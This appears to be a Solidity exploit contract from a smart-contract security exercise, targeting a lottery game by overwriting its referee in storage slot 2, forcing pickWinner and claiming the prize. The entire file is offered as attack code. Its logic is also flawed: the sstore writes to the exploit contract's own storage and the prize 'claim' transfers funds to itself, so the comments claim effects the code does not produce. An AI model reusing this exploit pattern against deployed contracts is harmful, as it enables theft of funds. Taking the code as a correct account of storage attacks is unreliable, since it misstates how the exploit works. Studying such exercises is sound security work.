// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import './Backdoor-assembly.sol';

contract MaliciousLotteryExploit {
    LotteryGame public lotteryGame;

    constructor(address _lotteryGame) {
        lotteryGame = LotteryGame(_lotteryGame);
    }

    function exploit() public {
        // Overwrite the referee's address (storage slot 2) with the attacker's address
        assembly {
            sstore(2, caller())
        }

        // Call pickWinner to set the winner to the attacker's address
        lotteryGame.pickWinner(address(this));

        // Claim the prize by sending a transaction that effectively transfers the prize
        // Here we simulate claiming by invoking payable functions or fallback if needed
        (bool success, ) = address(this).call{value: lotteryGame.prize()}("");
        require(success, "Failed to claim prize");
    }

    receive() external payable {}
}